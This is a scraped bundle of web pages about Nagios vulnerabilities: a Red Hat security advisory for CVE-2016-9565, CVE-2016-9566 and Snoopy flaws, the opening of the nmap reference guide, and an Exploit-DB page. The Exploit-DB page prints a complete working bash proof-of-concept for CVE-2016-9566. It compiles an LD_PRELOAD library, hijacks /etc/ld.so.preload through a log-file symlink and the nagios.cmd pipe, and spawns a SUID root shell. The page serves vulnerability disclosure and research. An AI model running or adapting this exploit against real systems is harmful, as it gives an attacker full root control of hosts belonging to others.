An update for nagios is now available for Red Hat Enterprise Linux OpenStack Platform 6.0 (Juno) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved. Nagios is written in C and designed to run under Linux (and some other \*NIX variants) as a background process, intermittently running checks on various services that you specify. The actual service checks are performed by separate "plugin" programs which return the status of the checks to Nagios. Nagios plugins are available at <http://sourceforge.net/projects/nagiosplug.> This package provides the core program, web interface, and documentation files for Nagios. Development files are built as a separate package.

Security Fix(es):

* Various command-execution flaws were found in the Snoopy library included with Nagios. These flaws allowed remote attackers to execute arbitrary commands by manipulating Nagios HTTP headers. (CVE-2008-7313, CVE-2014-5008, CVE-2014-5009)
* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privileges flaw was found in Nagios where log files were unsafely handled. An attacker who could control Nagios logging configuration ('nagios' user/group) could exploit the flaw to elevate their access to that of a privileged user. (CVE-2016-9566)

Red Hat would like to thank Dawid Golunski for reporting CVE-2016-9565 and CVE-2016-9566.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat OpenStack 6.0 x86\_64

## Fixes

* [BZ - 1121497](https://bugzilla.redhat.com/show_bug.cgi?id=1121497)
  - CVE-2008-7313 CVE-2014-5008 CVE-2014-5009 snoopy: incomplete fixes for command execution flaws
* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2008-7313](https://www.redhat.com/security/data/cve/CVE-2008-7313.html)
* [CVE-2014-5008](https://www.redhat.com/security/data/cve/CVE-2014-5008.html)
* [CVE-2014-5009](https://www.redhat.com/security/data/cve/CVE-2014-5009.html)
* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat OpenStack 6.0

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el7.src.rpm | SHA-256: 22be84749fe4d4876bf2252ea1ecfae60b887499272dd2c1664a3620ed20d636 |
| x86\_64 | |
| nagios-3.5.1-9.el7.x86\_64.rpm | SHA-256: 7888c2212b5be85dff6f97fdfa4518ee4b16e899e6dfc36bc83e4936f0c76400 |
| nagios-common-3.5.1-9.el7.x86\_64.rpm | SHA-256: 8e13e8b11bf94b0d3d2e0c2a9eaed02f82482a3191dbe30a40565b521f59a120 |
| nagios-debuginfo-3.5.1-9.el7.x86\_64.rpm | SHA-256: e92f087a7d2b3083f049929fd439e2a5de38cc817d5c9f1fa48c1672d4514feb |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from nmap.org_b89a31d3_20250126_033721.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

* [Nmap Network Scanning](toc.html)
* Chapter 15. Nmap Reference Guide

[Prev](data-files-replacing-data-files.html)[Next](man-briefoptions.html)
# Chapter 15. Nmap Reference Guide

Table of Contents

* [Description](man.html#man-description)
* [Options Summary](man-briefoptions.html)
* [Target Specification](man-target-specification.html)
* [Host Discovery](man-host-discovery.html)
* [Port Scanning Basics](man-port-scanning-basics.html)
* [Port Scanning Techniques](man-port-scanning-techniques.html)
* [Port Specification and Scan Order](man-port-specification.html)
* [Service and Version Detection](man-version-detection.html)
* [OS Detection](man-os-detection.html)
* [Nmap Scripting Engine (NSE)](man-nse.html)
* [Timing and Performance](man-performance.html)
* [Firewall/IDS Evasion and Spoofing](man-bypass-firewalls-ids.html)
* [Output](man-output.html)
* [Miscellaneous Options](man-misc-options.html)
* [Runtime Interaction](man-runtime-interaction.html)
* [Examples](man-examples.html)
* [Nmap Book](man-book.html)
* [Bugs](man-bugs.html)
* [Authors](man-author.html)
* [Legal Notices](man-legal.html)
  + [Nmap Copyright and Licensing](man-legal.html#nmap-copyright)
  + [Creative Commons License for this Nmap Guide](man-legal.html#man-copyright)
  + [Source Code Availability and Community Contributions](man-legal.html#source-contrib)
  + [No Warranty](man-legal.html#no-warranty)
  + [Inappropriate Usage](man-legal.html#inappropriate-usage)
  + [Third-Party Software and Funding Notices](man-legal.html#third-party-soft)
  + [United States Export Control](man-legal.html#us-export)
## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

```

The newest version of Nmap can be obtained from
[`https://nmap.org`](https://nmap.org). The newest version of this man page
is available at [`https://nmap.org/book/man.html`](https://nmap.org/book/man.html).
It is also included as a chapter of [*Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*](https://nmap.org/book/).

---

[Prev](data-files-replacing-data-files.html)Using Customized Data Files[Up](toc.html)Nmap Network Scanning[Home](toc.html)[Next](man-briefoptions.html)Options Summary

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_b972ed7d_20250124_212421.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Nagios < 4.2.4 - Local Privilege Escalation

#### EDB-ID:

###### 40921

#### CVE:

###### [2016-9566](https://nvd.nist.gov/vuln/detail/CVE-2016-9566)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2016-12-15

---

**Vulnerable App:**

```
#!/bin/bash
#
# Source: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# Nagios Core < 4.2.4  Root Privilege Escalation PoC Exploit
# nagios-root-privesc.sh (ver. 1.0)
#
# CVE-2016-9566
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory
#
#
# [Info]
#
# This PoC exploit allows privilege escalation from 'nagios' system account,
# or an account belonging to 'nagios' group, to root (root shell).
# Attackers could obtain such an account via exploiting another vulnerability,
# e.g. CVE-2016-9565 linked below.
#
# [Exploit usage]
#
# ./nagios-root-privesc.sh path_to_nagios.log
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# Video PoC:
# https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# CVE-2016-9565:
# https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nagiosrootsh"
PRIVESCLIB="/tmp/nagios_privesc_lib.so"
PRIVESCSRC="/tmp/nagios_privesc_lib.c"
SUIDBIN="/usr/bin/sudo"
commandfile='/usr/local/nagios/var/rw/nagios.cmd'

function cleanexit {
	# Cleanup
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro

echo -e "\033[94m \nNagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566) \nnagios-root-privesc.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Priv check
echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q nagios
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f "$ERRORLOG" ]; then
	echo -e "\n[!] Provided Nagios log path ($ERRORLOG) doesn't exist. Try again. E.g: \n"
	echo -e "./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log\n"
	exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi

# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the Nagios log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] The system appears to be exploitable (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

{
# Wait for Nagios to get restarted
echo -ne "\n[+] Waiting for Nagios service to get restarted...\n"
echo -n "Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	/usr/bin/printf "[%lu] SHUTDOWN_PROGRAM\n" `date +%s` > $commandfile
fi
sleep 3s
ps aux | grep -v grep | grep -i 'bin/nagios'
if [ $? -ne 0 ]; then
	echo -ne "\n[+] Nagios stopped. Shouldn't take long now... ;)\n"
fi
while :; do
	sleep 1 2>/dev/null
	if [ -f /etc/ld.so.preload ]; then
		rm -f $ERRORLOG
		break;
	fi
done

echo -e "\n[+] Nagios restarted. The /etc/ld.so.preload file got created with the privileges: \n`ls -l /etc/ld.so.preload`"

# /etc/ld.so.preload should be owned by nagios:nagios at this point with perms:
# -rw-r--r-- 1 nagios nagios
# Only 'nagios' user can write to it, but 'nagios' group can not.
# This is not ideal as in scenarios like CVE-2016-9565 we might be running as www-data:nagios user.
# We can bypass the lack of write perm on /etc/ld.so.preload by writing to Nagios external command file/pipe
# nagios.cmd, which is writable by 'nagios' group. We can use it to send a bogus command which will
# inject the path to our privesc library into the nagios.log file (i.e. the ld.so.preload file :)

sleep 3s 	# Wait for Nagios to create the nagios.cmd pipe
if [ ! -p $commandfile ]; then
	echo -e "\n[!] Nagios command pipe $commandfile does not exist!"
	exit 2
fi
echo -e "\n[+] Injecting $PRIVESCLIB via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload"
now=`date +%s`
/usr/bin/printf "[%lu] NAGIOS_GIVE_ME_ROOT_NOW!;; $PRIVESCLIB \n" $now > $commandfile
sleep 1s
grep -q "$PRIVESCLIB" /etc/ld.so.preload
if [ $? -eq 0 ]; then
	echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload | grep "$PRIVESCLIB"`"
else
	echo -e "\n[!] Unable to inject the lib to /etc/ld.so.preload"
	exit 2
fi

} 2>/dev/null

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Triggering privesc code from $PRIVESCLIB by executing $SUIDBIN SUID binary"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH | grep rws | grep -q root 2>/dev/null
if [ $? -eq 0 ]; then
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root via Nagios!\033[0m"
else
	echo -e "\n[!] Failed to get root: \n`ls -l $BACKDOORPATH`"
	cleanexit 2
fi

# Use the rootshell to perform cleanup that requires root privileges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
rm -f $ERRORLOG
echo > $ERRORLOG

# Execute the rootshell
echo -e "\n[+] Nagios pwned. Spawning the rootshell $BACKDOORPATH now\n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from rhn.redhat.com_9e5a847a_20250124_212412.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
